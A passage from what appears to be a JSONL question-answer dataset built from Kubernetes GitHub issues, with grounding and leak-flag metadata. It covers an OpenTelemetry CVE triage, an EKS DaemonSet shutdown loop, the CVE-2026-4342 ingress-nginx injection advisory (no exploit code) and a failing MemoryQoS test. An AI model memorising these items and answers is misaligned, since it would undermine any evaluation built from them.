kage resource // import \"go.opentelemetry.io/otel/sdk/resource\"\n./vendor/go.opentelemetry.io/otel/sdk/resource/host_id.go:4:package resource // import \"go.opentelemetry.io/otel/sdk/resource\"\n./vendor/go.opentelemetry.io/otel/sdk/resource/auto.go:4:package resource // import \"go.opentelemetry.io/otel/sdk/resource\"\n./vendor/go.opentelemetry.io/otel/sdk/trace/tracetest/span.go:11:       \"go.opentelemetry.io/otel/sdk/resource\"\n./vendor/go.opentelemetry.io/otel/sdk/trace/snapshot.go:11:     \"go.opentelemetry.io/otel/sdk/resource\"\n./vendor/go.opentelemetry.io/otel/sdk/trace/span.go:22: \"go.opentelemetry.io/otel/sdk/resource\"\n./vendor/go.opentelemetry.io/otel/sdk/trace/provider.go:15:     \"go.opentelemetry.io/otel/sdk/resource\"\n./vendor/go.opentelemetry.io/otel/exporters/otlp/otlptrace/internal/tracetransform/resource.go:9:       \"go.opentelemetry.io/otel/sdk/resource\"\n./vendor/go.opentelemetry.io/otel/exporters/otlp/otlptrace/internal/tracetransform/attribute.go:12:     \"go.opentelemetry.io/otel/sdk/resource\"\n./vendor/go.opentelemetry.io/otel/CHANGELOG.md:44:- `WithHostID` detector in `go.opentelemetry.io/otel/sdk/resource` to use full path for `ioreg` command on Darwin (macOS). (#7818)\n./vendor/go.opentelemetry.io/otel/CHANGELOG.md:226:- The semantic conventions have been upgraded from `v1.26.0` to `v1.34.0` in `go.opentelemetry.io/otel/sdk/resource`. (#6834)\n./vendor/go.opentelemetry.io/otel/CHANGELOG.md:561:- Upgrade `go.opentelemetry.io/otel/semconv/v1.25.0` to `go.opentelemetry.io/otel/semconv/v1.26.0` in `go.opentelemetry.io/otel/sdk/resource`. (#5490)\n./vendor/go.opentelemetry.io/otel/CHANGELOG.md:565:- `service.instance.id` is populated for a `Resource` created with `\"go.opentelemetry.io/otel/sdk/resource\".Default` with a default value when `OTEL_GO_X_RESOURCE` is set. (#5520)\n./vendor/go.opentelemetry.io/otel/CHANGELOG.md:741:- `ErrSchemaURLConflict` is added to `go.opentelemetry.io/otel/sdk/resource`.\n./vendor/go.opentelemetry.io/otel/CHANGELOG.md:746:- The `Merge` and `New` functions in `go.opentelemetry.io/otel/sdk/resource` now returns a partial result if there is a schema URL merge conflict.\n./vendor/go.opentelemetry.io/otel/CHANGELOG.md:881:- Fix improper parsing of characters such us `+`, `/` passed via `OTEL_RESOURCE_ATTRIBUTES` in `go.opentelemetry.io/otel/sdk/resource` as they were rendered as a whitespace. (#4699)\n./vendor/go.opentelemetry.io/otel/CHANGELOG.md:1008:- Fix `\"go.opentelemetry.io/otel/sdk/resource\".WithHostID()` to not set an empty `host.id`. (#4317)\n./vendor/go.opentelemetry.io/otel/CHANGELOG.md:1023:- Fix resource detection data race in `go.opentelemetry.io/otel/sdk/resource`. (#4409)\n./vendor/go.opentelemetry.io/otel/CHANGELOG.md:1076:- Fix build for BSD based systems in `go.opentelemetry.io/otel/sdk/resource`. (#4077)\n./vendor/go.opentelemetry.io/otel/CHANGELOG.md:1156:- Use the SDK version for the Telemetry SDK resource detector in `go.opentelemetry.io/otel/sdk/resource`. (#3949)\n./vendor/go.opentelemetry.io/otel/CHANGELOG.md:1173:- The `WithHostID` option to `go.opentelemetry.io/otel/sdk/resource`. (#3812)\n./vendor/go.opentelemetry.io/otel/CHANGELOG.md:1186:- The `New` and `Detect` functions from `go.opentelemetry.io/otel/sdk/resource` return errors that wrap underlying errors instead of just containing the underlying error strings. (#3844)\n./vendor/go.opentelemetry.io/otel/CHANGELOG.md:2082:- Multiple calls to `\"go.opentelemetry.io/otel/sdk/metric/controller/basic\".WithResource()` are handled correctly, and when no resources are provided `\"go.opentelemetry.io/otel/sdk/resource\".Default()` is used. (#2120)\n./vendor/go.opentelemetry.io/otel/CHANGELOG.md:2117:- Removed the `\"go.opentelemetry.io/otel/sdk/resource\".WithBuiltinDetectors` function.\n./vendor/go.opentelemetry.io/otel/CHANGELOG.md:2179:- Changes `go.opentelemetry.io/otel/sdk/resource.NewWithAttributes` to require a schema URL. The old function is still available as `resource.NewSchemaless`. This is a breaking change. (#1938)\n./vendor/go.opentelemetry.io/otel/CHANGELOG.md:2262:- Only report errors from the `\"go.opentelemetry.io/otel/sdk/resource\".Environment` function when they are not `nil`. (#1850, #1851)\n./vendor/go.opentelemetry.io/otel/CHANGELOG.md:2416:- Renamed the `LabelSet` method of `\"go.opentelemetry.io/otel/sdk/resource\".Resource` to `Set`. (#1692)\n./vendor/modules.txt:745:go.opentelemetry.io/otel/sdk/resource\n```\n\nGrype output:\n\n```bash\n~/kubernetes$ grype dir:.\n \u2714 Indexed file system                                                                                                                                                                                       .\n \u2714 Cataloged contents                                                                                                                         cdb4ee2aea69cc6a83331bbe96dc2caa9a299d21329efb0336fc02a82e1839a8\n   \u251c\u2500\u2500 \u2714 Packages                        [2,057 packages]\n   \u251c\u2500\u2500 \u2714 Executables                     [0 executables]\n   \u251c\u2500\u2500 \u2714 File digests                    [40 files]\n   \u2514\u2500\u2500 \u2714 File metadata                   [40 locations]\n \u2714 Scanned for vulnerabilities     [16 vulnerability matches]\n   \u251c\u2500\u2500 by severity: 0 critical, 11 high, 5 medium, 0 low, 0 negligible\n   \u2514\u2500\u2500 by status:   13 fixed, 3 not-fixed, 0 ignored\n[0000]  WARN no explicit name and version provided for directory source, deriving artifact ID from the given path (which is not ideal)\nNAME                                 INSTALLED  FIXED-IN  TYPE       VULNERABILITY        SEVERITY  EPSS%  RISK\ngithub.com/golang/glog               v1.2.2     1.2.4     go-module  GHSA-6wxm-mpqj-6jpf  Medium    23.45  < 0.1\ngithub.com/go-viper/mapstructure/v2  v2.3.0     2.4.0     go-module  GHSA-2464-8j7c-4cjm  Medium     0.84  < 0.1\ngo.opentelemetry.io/otel/sdk         v1.40.0    1.43.0    go-module  GHSA-hfvc-g4fc-pqhx  High       0.29  < 0.1\ngo.etcd.io/bbolt                     v1.4.3               go-module  GHSA-6jwv-w5xf-7j27  Medium      N/A    N/A\n```\n\nThe reported affected platforms are DragonFly BSD, FreeBSD, NetBSD, OpenBSD, and Solaris, and the Kubernetes context noted is that Kubernetes primarily runs on Linux. Should Kubernetes treat CVE-2026-39883 as affecting it and upgrade `go.opentelemetry.io/otel/sdk` to v1.43.0 or later?", "answer": "The maintainer said this CVE does not affect Kubernetes. The affected code is behind the OpenTelemetry `host_id_bsd.go` build tag for DragonFly BSD, FreeBSD, NetBSD, OpenBSD, and Solaris, and Kubernetes does not support or ship binaries/images for any of those platforms.\n\nReference: https://github.com/open-telemetry/opentelemetry-go/blob/2ce48ddbe38e2f1973e137163fe5115d5f26ae9e/sdk/resource/host_id_bsd.go#L4\nhttps://github.com/kubernetes/kubernetes/blob/master/CHANGELOG/CHANGELOG-1.35.md#v1353", "knowledge_type": "grounded", "grounding_sources": ["https://github.com/open-telemetry/opentelemetry-go/blob/2ce48ddbe38e2f1973e137163fe5115d5f26ae9e/sdk/resource/host_id_bsd.go#L4", "https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG/CHANGELOG-1.35.md#v1353"], "answer_grounded_in": "c3", "leak_flags": ["fixed_versions:v1.43.0"]}], "answer_in_thread_refs": ["2ce48ddbe38e2f1973e137163fe5115d5f26ae9e", "https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG/CHANGELOG-1.35.md#v1353", "https://github.com/open-telemetry/opentelemetry-go/blob/2ce48ddbe38e2f1973e137163fe5115d5f26ae9e/sdk/resource/host_id_bsd.go#L4"], "leak_flags": ["fixed_versions:v1.43.0"], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-18T04:05:51.708914Z", "review_note": ""}
{"id": "kubernetes/kubernetes/issue/137895", "repo": "kubernetes/kubernetes", "number": 137895, "title": "EKS 1.34  DaemonSet Controller created a lot of pod during node deletion", "url": "https://github.com/kubernetes/kubernetes/issues/137895", "state": "closed", "created_at": "2026-03-19T15:12:32Z", "closed_at": "2026-03-23T14:12:57Z", "labels": ["kind/bug", "needs-sig", "needs-triage"], "reporter": "tomahkvt", "security_topic": "Graceful node shutdown causing DaemonSet pod recreation loop", "qa_summary": "The developer needed to know whether the repeated DaemonSet pod recreation during node shutdown was caused by Graceful Node Shutdown behavior and what configuration change fixes it, and the answer is anchored on the EKS NodeConfig kubelet shutdownGracePeriod and shutdownGracePeriodCriticalPods settings.", "question_comment_id": "c0", "answer_comment_id": "c4", "question_author": "tomahkvt", "answer_author": "tomahkvt", "answerer_role": "op_self", "artifacts_needed": ["documentation", "code"], "hard_facts": {"cve_ids": [], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": ["v1.34.4-eks-f69f56f"], "fix_prs": [], "fix_commits": [], "advisory_urls": []}, "human_note": "", "llm_confidence": 0.7124999999999999, "comments": [{"id": "c0", "author": "tomahkvt", "timestamp": "2026-03-19T15:12:32Z", "body": "### What happened?\n\nHello,\n\nSince upgrading our cluster to Kubernetes version 1.34, we have encountered destructive behavior in system components during node decommission (scale-down/termination). The issue manifests as an infinite pod recreation cycle, causing significant overhead on the API server.\n\nIssue Description:\nWhen a node initiates the shutdown sequence, the Kubelet correctly begins rejecting pod execution. However, high-level controllers (specifically the DaemonSet Controller) do not interpret this state as final and continuously attempt to reschedule pods back onto the same shutting-down node.\n\nObserved Symptoms:\n\n1)Massive Pod Rejections: Pods are terminated or rejected with the error: Pod was rejected: Pod was rejected as the node is shutting down.\n\n2)Scheduler Loop: The scheduler assigns a pod to the node -> Kubelet rejects it -> The Controller detects the missing pod and triggers a new request -> The Scheduler picks the same node again.\n\n3)Affected System Components (stuck in Pending):\n\nistio-cni-node, ztunnel\n\naws-node, kube-proxy\n\nebs-csi-node, efs-csi-node, s3-csi-node\n\neks-node-monitoring-agent, eks-pod-identity-agent\n\n4)ztunnel Flapping: We are observing a critical anomaly where a single ztunnel pod goes through the \"Create-Reject-Delete\" cycle hundreds of times during a single node's removal. This creates parasitic load on etcd, the kube-apiserver, and Istio control plane.\n\nTechnical Context:\n\nK8s Version: 1.34\n\nFeature involved: Graceful Node Shutdown. It appears there is a regression in how Node Taints and Lifecycle states are synchronized between the Kubelet and the Scheduler in v1.34.\n\nImpact: System pods remain in Pending indefinitely while the node is dying, preventing clean cluster scaling.\n\nWe request your assistance with the following:\n\nConfirm if this is a known regression in the v1.34 Node Lifecycle / DaemonSet logic.\n\nProvide recommendations for NodeLifecycleController or GracefulNodeShutdown configurations to prevent the Scheduler from targeting nodes in a shutdown state.\n\nAdvise if there is a temporary patch or a specific Feature Gate to resolve this race condition.\n\nBest regards,\n\n### What did you expect to happen?\n\nIn EKS 1.33 we didn't have such problem with cretion of 300 daemon pod during node deletion.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nPlease try to delete node with daemon set pods ztunnel\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\nkubectl version\nClient Version: v1.33.0\nKustomize Version: v5.6.0\nServer Version: v1.34.4-eks-3a10415\n\n\n</details>\n\n\n### Cloud provider\n\nAWS EKS \n<details>\n\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "role": "body"}, {"id": "c1", "author": "k8s-ci-robot", "timestamp": "2026-03-19T15:12:40Z", "body": "There are no sig labels on this issue. Please add an appropriate label by using one of the following commands:\n- `/sig <group-name>`\n- `/wg <group-name>`\n- `/committee <group-name>`\n\nPlease see the [group list](https://git.k8s.io/community/sig-list.md) for a listing of the SIGs, working groups, and committees available.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>", "role": "comment"}, {"id": "c2", "author": "k8s-ci-robot", "timestamp": "2026-03-19T15:12:42Z", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>", "role": "comment"}, {"id": "c3", "author": "brianpursley", "timestamp": "2026-03-19T18:55:01Z", "body": "Not saying this isn't a bug, but it might not be a Kubernetes 1.34 regression.  It could have suddenly started happening due to this EKS AMI change:\nhttps://github.com/awslabs/amazon-eks-ami/blob/2bed73dc4fafb502298fa67534dc53a030e56b21/nodeadm/internal/kubelet/config.go#L245-L252\n\nIt looks like the default is `0s`, so if EKS didn't set it previously, it could have been using the default:\nhttps://github.com/kubernetes/kubernetes/blob/f1ccd2d8aae47ee36994ee4e92462f00a3f2146b/pkg/kubelet/apis/config/types.go#L457-L467\n\n", "role": "comment"}, {"id": "c4", "author": "tomahkvt", "timestamp": "2026-03-23T14:12:57Z", "body": "We found the root cause of the issue and identified how to fix it.\n\nOn a node running Kubernetes version v1.34.4-eks-f69f56f, there was no explicit shutdownGracePeriod or shutdownGracePeriodCriticalPods configuration in /etc/kubernetes/kubelet/config.json.\n\nOn the affected node, the following default values were present:\n\ncat /etc/kubernetes/kubelet/config.json | grep shut\n\n\"shutdownGracePeriod\": \"2m30s\",\n\"shutdownGracePeriodCriticalPods\": \"30s\",\n\nTo fix this, we changed these values in the configuration:\n\napiVersion: node.eks.aws/v1alpha1\nkind: NodeConfig\nspec:\nkubelet:\nconfig:\nshutdownGracePeriodCriticalPods: 0s\nshutdownGracePeriod: 10s\n\nAfter this change, DaemonSet pods are no longer being evicted with the status \"Node is shutting down\", and the scheduler no longer tries to run these pods on a shutting-down node.\n@brianpursley Thank you a lot for your help.\n", "role": "comment"}], "qa_pairs": [{"qid": "kubernetes/kubernetes/issue/137895#1", "question": "In an AWS EKS cluster upgraded to Kubernetes 1.34, during node decommission/scale-down/termination the kubelet starts rejecting pods with `Pod was rejected: Pod was rejected as the node is shutting down`, but controllers such as the DaemonSet Controller appear to continuously recreate pods on the same shutting-down node. The scheduler assigns a pod to the node, kubelet rejects it, the controller detects the missing pod and creates another, and the scheduler picks the same node again. Affected DaemonSet/system pods stuck in Pending include `istio-cni-node`, `ztunnel`, `aws-node`, `kube-proxy`, `ebs-csi-node`, `efs-csi-node`, `s3-csi-node`, `eks-node-monitoring-agent`, and `eks-pod-identity-agent`; a single `ztunnel` pod can go through the create/reject/delete cycle hundreds of times during one node removal, adding load to etcd, kube-apiserver, and Istio control plane. This did not happen on EKS/Kubernetes 1.33, but occurs with client `v1.33.0` and server `v1.34.4-eks-3a10415` on AWS EKS. Reproduction is deleting a node that has DaemonSet pods such as `ztunnel`. Is this a known Kubernetes v1.34 Node Lifecycle/DaemonSet or Graceful Node Shutdown regression, and what NodeLifecycleController/GracefulNodeShutdown configuration, temporary patch, or feature gate can prevent the scheduler from targeting nodes in shutdown state?", "answer": "The root cause was the kubelet shutdown grace period configuration on EKS nodes. On an affected Kubernetes `v1.34.4-eks-f69f56f` node, `/etc/kubernetes/kubelet/config.json` effectively had `\"shutdownGracePeriod\": \"2m30s\"` and `\"shutdownGracePeriodCriticalPods\": \"30s\"`; changing the EKS `NodeConfig` kubelet config to `shutdownGracePeriod: 10s` and `shutdownGracePeriodCriticalPods: 0s` fixed the behavior. After that change, DaemonSet pods were no longer evicted with `Node is shutting down`, and the scheduler no longer tried to run them on a shutting-down node.", "knowledge_type": "grounded", "grounding_sources": ["/etc/kubernetes/kubelet/config.json", "Kubernetes v1.34.4-eks-f69f56f"], "answer_grounded_in": "c4", "leak_flags": []}], "answer_in_thread_refs": [], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-18T04:21:08.283753Z", "review_note": ""}
{"id": "kubernetes/kubernetes/issue/137893", "repo": "kubernetes/kubernetes", "number": 137893, "title": "CVE-2026-4342: ingress-nginx comment-based nginx configuration injection", "url": "https://github.com/kubernetes/kubernetes/issues/137893", "state": "closed", "created_at": "2026-03-19T14:32:54Z", "closed_at": "2026-03-19T21:41:00Z", "labels": ["kind/bug", "sig/network", "area/security", "lifecycle/frozen", "committee/security-response", "triage/accepted", "official-cve-feed"], "reporter": "tabbysable", "security_topic": "specific CVE/advisory and fix release timing", "qa_summary": "Whether CVE-2026-4342 in ingress-nginx is affected and fixed, anchored by the CVE ID plus the public fix PR #14728 and the released patched versions v1.13.9, v1.14.5, and v1.15.1.", "question_comment_id": "c1", "answer_comment_id": "c2", "question_author": "Siddartha-DevOps", "answer_author": "tabbysable", "answerer_role": "maintainer", "artifacts_needed": ["advisory", "pr_data", "documentation"], "hard_facts": {"cve_ids": ["CVE-2026-4342"], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": ["v1.13.9", "v1.14.5", "v1.15.1"], "fix_prs": ["#14728"], "fix_commits": [], "advisory_urls": ["https://github.com/kubernetes/kubernetes/issues/137893"]}, "human_note": "", "llm_confidence": 0.9025, "comments": [{"id": "c0", "author": "tabbysable", "timestamp": "2026-03-19T14:32:54Z", "body": "CVSS Rating: 8.8 (Medium) [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)\n\nA security issue was discovered in ingress-nginx where a combination of Ingress annotations can be used to inject configuration into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx controller, and disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)\n\n### Am I vulnerable?\n\nThis issue affects ingress-nginx. If you do not have ingress-nginx installed on your cluster, you are not affected. You can check this by running `kubectl get pods --all-namespaces --selector app.kubernetes.io/name=ingress-nginx`.\n\n#### Affected Versions\n\n- ingress-nginx: < v1.13.9\n- ingress-nginx: < v1.14.5\n- ingress-nginx: < v1.15.1\n\n### How do I mitigate this vulnerability?\n\n\n\n#### How to upgrade?\n\nTo upgrade, refer to the documentation: [Upgrading Ingress-nginx](https://kubernetes.github.io/ingress-nginx/deploy/upgrade/)\n\n### Detection\n\nSuspicious data within the `rules.http.paths.path` field of an Ingress resource could indicate an attempt to exploit this vulnerability.\n\nIf you find evidence that this vulnerability has been exploited, please contact **security@kubernetes.io**\n\n#### Acknowledgements\n\nThis vulnerability was reported by wooseokdotkim.\n\n/triage accepted\n/lifecycle frozen\n/area security\n/kind bug\n/committee security-response\n\n<details>\n<summary>OSV format</summary>\n\n```json osv\n{\n  \"schema_version\": \"1.6.0\",\n  \"id\": \"CVE-2026-4342\",\n  \"modified\": \"2026-03-19T17:11:29Z\",\n  \"summary\": \"ingress-nginx comment-based nginx configuration injection\",\n  \"details\": \"A security issue was discovered in ingress-nginx where a combination of Ingress annotations can be used to inject configuration into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx controller, and disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)\",\n  \"severity\": [\n    {\n      \"type\": \"CVSS_V3\",\n      \"score\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\"\n    }\n  ],\n  \"affected\": [\n    {\n      \"package\": {\n        \"ecosystem\": \"Kubernetes\",\n        \"name\": \"ingress-nginx\"\n      },\n      \"ranges\": [\n        {\n          \"type\": \"SEMVER\",\n          \"events\": [\n            {\n              \"introduced\": \"0\"\n            },\n            {\n              \"fixed\": \"v1.13.9\"\n            },\n            {\n              \"introduced\": \"0\"\n            },\n            {\n              \"fixed\": \"v1.14.5\"\n            },\n            {\n              \"introduced\": \"0\"\n            },\n            {\n              \"fixed\": \"v1.15.1\"\n            }\n          ]\n        }\n      ]\n    }\n  ],\n  \"references\": [\n    {\n      \"type\": \"ADVISORY\",\n      \"url\": \"https://www.cve.org/cverecord?id=CVE-2026-4342\"\n    },\n    {\n      \"type\": \"ADVISORY\",\n      \"url\": \"https://github.com/kubernetes/kubernetes/issues/137893\"\n    },\n    {\n      \"type\": \"WEB\",\n      \"url\": \"https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\"\n    }\n  ],\n  \"credits\": [\n    {\n      \"name\": \"This vulnerability was reported by wooseokdotkim.\",\n      \"type\": \"FINDER\"\n    }\n  ]\n}\n```\n\n</details>\n\n<!-- generated by srctl v1.0.1 (277a81449bef-dirty, 2026-03-02T21:32:55Z, go1.25.6) -->", "role": "body"}, {"id": "c1", "author": "Siddartha-DevOps", "timestamp": "2026-03-19T15:04:01Z", "body": "@k8s-ci-robot @tabbysable \nCan you please clarify if this placeholder issue corresponds to a specific CVE or security advisory, and when more details will be published? if guidance is provided, I can help giving my full-time availability to this issue.\n", "role": "comment"}, {"id": "c2", "author": "tabbysable", "timestamp": "2026-03-19T17:16:58Z", "body": "Fix PR: https://github.com/kubernetes/ingress-nginx/pull/14728\n\nAs is our policy, this announcement is being made along with the public release of the fix source code.\n\nRelease builds for v1.15.1, v1.14.5, and v1.13.9 are in progress. I will update the ticket when they are available.", "role": "comment"}, {"id": "c3", "author": "tabbysable", "timestamp": "2026-03-19T21:40:53Z", "body": "Release builds have finished, and the patched versions are available from all the usual places.\n\nSpecial thanks to @Gacko, @Stevenjin8, and @strongjz for their hustle to get this fix written, tested, and published before KubeCon. It has been a wonderful pleasure to work with you to give all ingress-nginx users the cleanest, safest final release we possibly can.\n\n/honk\n/close", "role": "comment"}, {"id": "c4", "author": "k8s-ci-robot", "timestamp": "2026-03-19T21:40:57Z", "body": "@tabbysable: \n![goose image](https://images.unsplash.com/photo-1558897050-1008c5a29a57?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3w5NDI1N3wwfDF8cmFuZG9tfHx8fHx8fHx8MTc3Mzk1NjQ1Nnw&ixlib=rb-4.1.0&q=80&w=400)\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/137893#issuecomment-4093471929):\n\n>Release builds have finished, and the patched versions are available from all the usual places.\n>\n>Special thanks to @Gacko, @Stevenjin8, and @strongjz for their hustle to get this fix written, tested, and published before KubeCon. It has been a wonderful pleasure to work with you to give all ingress-nginx users the cleanest, safest final release we possibly can.\n>\n>/honk\n>/close\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>", "role": "comment"}, {"id": "c5", "author": "k8s-ci-robot", "timestamp": "2026-03-19T21:41:00Z", "body": "@tabbysable: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/137893#issuecomment-4093471929):\n\n>Release builds have finished, and the patched versions are available from all the usual places.\n>\n>Special thanks to @Gacko, @Stevenjin8, and @strongjz for their hustle to get this fix written, tested, and published before KubeCon. It has been a wonderful pleasure to work with you to give all ingress-nginx users the cleanest, safest final release we possibly can.\n>\n>/honk\n>/close\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>", "role": "comment"}, {"id": "c6", "author": "Toumash", "timestamp": "2026-04-08T11:39:36Z", "body": "> Is `{{ $server.Hostname }}` safe ? Shouldn't it be removed from comment too?\n\ni was about to ask the same. How is this a vulnerability if you give cluster rights to untrusted individuals/apps and allow malicious inputs in the plain text?\nThen the rest of the config is basically a new CVE same as `$location.ExternalAuth`.\nNo?", "role": "comment"}, {"id": "c7", "author": "tombokombo", "timestamp": "2026-04-14T10:05:12Z", "body": "ingress hostname is validated by  regex `[a-z0-9]([-a-z0-9]*[a-z0-9])?(\\.[a-z0-9]([-a-z0-9]*[a-z0-9])?)*`,  so it is safe", "role": "comment"}], "qa_pairs": [{"qid": "kubernetes/kubernetes/issue/137893#1", "question": "For a Kubernetes security issue titled \u201cCVE-2026-4342: ingress-nginx comment-based nginx configuration injection,\u201d the issue text says a security issue was discovered in ingress-nginx where a combination of Ingress annotations can be used to inject configuration into nginx, potentially leading to arbitrary code execution in the context of the ingress-nginx controller and disclosure of Secrets accessible to the controller. It lists affected versions as ingress-nginx < v1.13.9, < v1.14.5, and < v1.15.1, and says suspicious data in `rules.http.paths.path` could indicate exploitation. Can you clarify whether this placeholder issue corresponds to a specific CVE or security advisory, and when more details will be published? If guidance is provided, I can help with full-time availability on this issue.", "answer": "The maintainer pointed to the fix PR: https://github.com/kubernetes/ingress-nginx/pull/14728. They said that, per policy, the announcement was being made together with the public release of the fix source code. Release builds for v1.15.1, v1.14.5, and v1.13.9 were in progress and the ticket would be updated when they became available.", "knowledge_type": "grounded", "grounding_sources": ["https://github.com/kubernetes/ingress-nginx/pull/14728", "ingress-nginx v1.15.1", "ingress-nginx v1.14.5", "ingress-nginx v1.13.9"], "answer_grounded_in": "c2", "leak_flags": ["fixed_versions:v1.13.9", "fixed_versions:v1.14.5", "fixed_versions:v1.15.1"]}], "answer_in_thread_refs": ["https://github.com/kubernetes/ingress-nginx/pull/14728"], "leak_flags": ["fixed_versions:v1.13.9", "fixed_versions:v1.14.5", "fixed_versions:v1.15.1"], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-18T04:29:54.446702Z", "review_note": ""}
{"id": "kubernetes/kubernetes/issue/137891", "repo": "kubernetes/kubernetes", "number": 137891, "title": "[Failing Test] MemoryQoS [Serial] feature rollback should reset memory protection to 0 when MemoryQoS is disabled", "url": "https://github.com/kubernetes/kubernetes/issues/137891", "state": "closed", "created_at": "2026-03-19T13:14:39Z", "closed_at": "2026-03-19T22:39:00Z", "labels": ["priority/important-soon", "sig/node", "kind/failing-test", "triage/accepted"], "reporter": "kannon92", "security_topic": "memory protection rollback when a feature is disabled", "qa_summary": "Whether the MemoryQoS rollback bug that left memory.low at 134217728 instead of 0 when disabled was being fixed by Kubernetes PR #137889, which checks the QoS cgroup tier.", "question_comment_id": "c0", "answer_comment_id": "c1", "question_author": "kannon92", "answer_author": "QiWang19", "answerer_role": "commenter", "artifacts_needed": ["pr_data"], "hard_facts": {"cve_ids": [], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": [], "fix_prs": ["#137889"], "fix_commits": [], "advisory_urls": []}, "human_note": "", "llm_confidence": 0.9025, "comments": [{"id": "c0", "author": "kannon92", "timestamp": "2026-03-19T13:14:39Z", "body": "### Which jobs are failing?\n\nMemoryQoS [Serial] feature rollback should reset memory protection to 0 when MemoryQoS is disabled\n\n### Which tests are failing?\n\nMemoryQoS [Serial] feature rollback should reset memory protection to 0 when MemoryQoS is disabled\n\n### Since when has it been failing?\n\nYesterday\n\n### Testgrid link\n\nhttps://testgrid.k8s.io/sig-node-release-blocking#node-kubelet-serial-containerd\n\n### Reason for failure (if possible)\n\n```\n{ failed [FAILED] Timed out after 120.005s.\nmemory.low should reset to 0 when MemoryQoS is disabled\nExpected\n    <int64>: 134217728\nto equal\n    <int64>: 0\nIn [It] at: k8s.io/kubernetes/test/e2e_node/memory_qos_test.go:621 @ 03/19/26 09:03:19.345\n}\n```\n\n### Anything else we need to know?\n\n_No response_\n\n### Relevant SIG(s)\n\n/sig", "role": "body"}, {"id": "c1", "author": "QiWang19", "timestamp": "2026-03-19T13:43:07Z", "body": "It is being addressed by https://github.com/kubernetes/kubernetes/pull/137889 that checks QoS cgroup tier.", "role": "comment"}, {"id": "c2", "author": "k8s-ci-robot", "timestamp": "2026-03-19T22:39:01Z", "body": "@kannon92: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/137891#issuecomment-4093754504):\n\n>/close\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>", "role": "comment"}], "qa_pairs": [{"qid": "kubernetes/kubernetes/issue/137891#1", "question": "In kubernetes/kubernetes, the node kubelet serial containerd job is failing on the test \"MemoryQoS [Serial] feature rollback should reset memory protection to 0 when MemoryQoS is disabled\". It has been failing since yesterday on Testgrid: https://testgrid.k8s.io/sig-node-release-blocking#node-kubelet-serial-containerd. The failure is:\n\n```\n{ failed [FAILED] Timed out after 120.005s.\nmemory.low should reset to 0 when MemoryQoS is disabled\nExpected\n    <int64>: 134217728\nto equal\n    <int64>: 0\nIn [It] at: k8s.io/kubernetes/test/e2e_node/memory_qos_test.go:621 @ 03/19/26 09:03:19.345\n}\n```\n\nWhat is addressing this failing test?", "answer": "It is addressed by https://github.com/kubernetes/kubernetes/pull/137889, which checks the QoS cgroup tier.", "knowledge_type": "grounded", "grounding_sources": ["https://github.com/kubernetes/kubernetes/pull/137889"], "answer_grounded_in": "c1", "leak_flags": []}], "answer_in_thread_refs": ["https://github.com/kubernetes/kubernetes/pull/137889"], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": 